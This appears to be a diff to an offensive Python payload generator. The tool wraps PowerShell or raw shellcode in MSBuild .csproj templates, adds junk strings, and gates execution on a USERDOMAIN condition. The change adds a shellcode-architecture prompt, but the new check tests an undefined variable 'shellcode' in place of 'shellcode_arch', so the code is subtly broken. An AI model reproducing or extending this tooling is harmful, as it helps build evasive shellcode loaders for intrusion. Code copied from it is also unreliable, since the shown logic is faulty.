@@ -168,6 +168,7 @@ if __name__ == "__main__":
 	gen = Generator()
 	input_name = "PowerShell script"
 	data = ""
+	shellcode_arch = ""
 	
 	if len(sys.argv) >= 4:
 		IS_CMD_ARGS = True
@@ -177,6 +178,9 @@ if __name__ == "__main__":
 		if gen.capture_input("Set payload type 'powershell, shellcode'", 3) == "shellcode".lower():
 			input_name = "raw shellcode file"
 			TEMPLATE = TEMPLATE + "shellcode.csproj"
+			shellcode_arch = gen.capture_input("Shellcode architecture (32/64)")
+			if not shellcode == "64":
+				shellcode = ""
 		else:
 			TEMPLATE = TEMPLATE + "powershell.csproj"
 
@@ -203,6 +207,7 @@ if __name__ == "__main__":
 		output = output.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
 		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 4).strip()
 		output = gen.set_condition(output, condition)
+		output = output.replace("[ARCH]", shellcode_arch)
 		
 		try:
 			open(outfile, "wb").write(output)
